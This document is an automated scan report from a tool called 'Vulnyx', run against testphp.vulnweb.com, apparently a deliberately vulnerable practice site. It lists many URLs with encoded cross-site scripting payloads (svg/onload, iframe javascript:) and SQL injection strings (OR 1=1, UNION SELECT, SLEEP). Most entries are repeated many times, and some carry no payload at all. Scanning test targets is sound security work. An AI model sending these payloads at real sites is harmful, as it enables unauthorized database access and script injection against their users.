=== Vulnyx Scan Report ===
Timestamp: 20250426_015038
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Csvg%2Fonload%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=3
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=3
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=3
[XSS] http://testphp.vulnweb.com/signup.php
[XSS] http://testphp.vulnweb.com/signup.php
[XSS] http://testphp.vulnweb.com/signup.php
[XSS] http://testphp.vulnweb.com/signup.php

>>> SQL Injection Vulnerabilities:
[SQLi] http://testphp.vulnweb.com/userinfo.php
[SQLi] http://testphp.vulnweb.com/userinfo.php
[SQLi] http://testphp.vulnweb.com/login.php
[SQLi] http://testphp.vulnweb.com/login.php
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/artists.php?artist=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/artists.php?artist=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+AND+SLEEP%285%29+--%27+OR+1%3D1%23
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/product.php?pic=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/product.php?pic=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/artists.php?artist=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/artists.php?artist=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+%271%27%3D%271
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%22+OR+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+UNION+SELECT+NULL%2C+version%28%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+1%3D1--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+%27x%27%3D%27x
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=1%27+AND+1%3D1+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--
[SQLi] http://testphp.vulnweb.com/listproducts.php?artist=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CNULL+--
[SQLi] http://testphp.vulnweb.com/signup.php
[SQLi] http://testphp.vulnweb.com/signup.php
